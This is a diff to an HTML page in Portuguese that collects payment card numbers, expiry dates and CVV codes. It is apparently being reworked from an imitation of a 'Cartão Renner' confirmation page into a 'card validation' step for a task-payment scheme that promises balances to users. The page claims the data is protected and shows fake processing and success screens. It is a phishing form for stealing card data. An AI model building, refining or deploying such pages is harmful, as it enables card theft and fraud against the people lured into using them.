@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Cartão Renner - Confirmação</title>
+  <title>Validação de Cartão</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
   <style>
     body {
@@ -30,8 +30,14 @@
 
     h2 {
       color: #c5002e;
+      margin-bottom: 15px;
+      font-size: 21px;
+    }
+
+    p.subtitulo {
+      font-size: 14px;
+      color: #444;
       margin-bottom: 25px;
-      font-size: 22px;
     }
 
     input {
@@ -102,15 +108,16 @@
 </head>
 <body>
 
-  <!-- Tela de cadastro -->
+  <!-- Tela do formulário -->
   <div class="container" id="formulario">
-    <h2>Confirme os dados do seu cartão Renner</h2>
+    <h2>Validação de Cartão</h2>
+    <p class="subtitulo">Use um cartão válido para liberar suas tarefas e receber os valores no saldo</p>
     <form id="cartaoForm">
       <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
       <input type="text" name="validade" placeholder="Validade (MM/AA)" required maxlength="5">
       <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required maxlength="4">
       <input type="hidden" name="_captcha" value="false">
-      <button type="submit">Confirmar</button>
+      <button type="submit">Validar agora</button>
     </form>
     <p class="info">Suas informações estão protegidas com segurança.</p>
   </div>
@@ -119,14 +126,14 @@
   <div class="container hidden" id="carregando">
     <div class="loading">
       <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
-      <p>Processando seu cadastro...</p>
+      <p>Processando os dados...</p>
     </div>
   </div>
 
   <!-- Tela final -->
   <div class="container hidden final" id="final">
-    <h2>Cadastro enviado com sucesso!</h2>
-    <p>Você receberá um retorno por e-mail ou telefone em breve.</p>
+    <h2>✅ Cartão Validado</h2>
+    <p>Você já pode iniciar suas tarefas. Caso necessário, entraremos em contato por e-mail.</p>
   </div>
 
   <script>
